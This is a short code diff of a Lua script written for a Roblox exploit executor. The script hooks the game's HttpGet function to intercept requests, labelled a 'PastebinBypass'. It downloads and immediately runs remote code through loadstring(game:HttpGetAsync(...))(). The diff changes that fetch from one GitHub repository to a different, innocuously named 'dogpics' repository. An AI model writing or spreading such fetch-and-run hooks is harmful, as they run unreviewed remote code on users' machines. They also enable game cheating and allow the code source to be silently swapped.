@@ -3,10 +3,11 @@ spawn(function()
 	pcall(function() getgenv().slink = true end)
 	spawn(function()
 		local PastebinBypass
-		local scriptcheck = loadstring(game:HttpGetAsync"https://raw.githubusercontent.com/mrjack-coder/script/main/excluded%20links")()
+		local scriptcheck = loadstring(game:HttpGetAsync"https://raw.githubusercontent.com/thedragonslayer2/dogpics/main/exclude%20link")()
 		PastebinBypass = hookfunction(game.HttpGet, function(self, url, state)
-			if tostring(url) ~= "https://raw.githubusercontent.com/mrjack-coder/script/main/excluded%20links" then
+			if tostring(url) ~= "https://raw.githubusercontent.com/thedragonslayer2/dogpics/main/exclude%20link" then
 				for _, v in pairs(scriptcheck) do
+                    wait()
 					if string.find(tostring(url), tostring(v)) or string.find(tostring(url), tostring(v)) or string.match(tostring(url), tostring(v)) or string.match(tostring(url), tostring(v)) then return coroutine.resume(PastebinBypass(self, url, state)) end
 				end
 				spawn(function()
